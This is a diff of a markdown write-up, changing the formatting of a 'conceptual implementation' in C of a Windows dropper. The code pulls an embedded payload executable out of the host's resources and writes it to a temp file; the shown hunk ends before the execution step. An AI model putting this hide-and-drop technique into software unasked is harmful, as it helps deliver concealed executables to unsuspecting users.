@@ -85,9 +85,9 @@ When the host executable runs, it performs the following steps to reconstruct an
 
 Below is a conceptual implementation demonstrating the extraction, execution, and tracking of the payload using `OpenProcess`.
 
-```cpp
+```c
 #include <windows.h>
-#include <iostream>
+#include <stdio.h>
 
 #define IDR_PAYLOAD_EXE 101
 
@@ -95,7 +95,8 @@ int main() {
     
     HMODULE hModule = GetModuleHandle(NULL);
     HRSRC hRes = FindResource(hModule, MAKEINTRESOURCE(IDR_PAYLOAD_EXE), RT_RCDATA);
-    if (!hRes) return 1;
+    if (!hRes)
+	 return 1;
 
     HGLOBAL hData = LoadResource(hModule, hRes);
     LPVOID pBuffer = LockResource(hData);
@@ -106,7 +107,8 @@ int main() {
     GetTempPathA(MAX_PATH, tempPath);
     GetTempFileNameA(tempPath, "PL", 0, tempFile); 
     HANDLE hFile = CreateFileA(tempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) return 1;
+    if (hFile == INVALID_HANDLE_VALUE)
+		return 1;
 
     DWORD dwBytesWritten;
     WriteFile(hFile, pBuffer, dwSize, &dwBytesWritten, NULL);
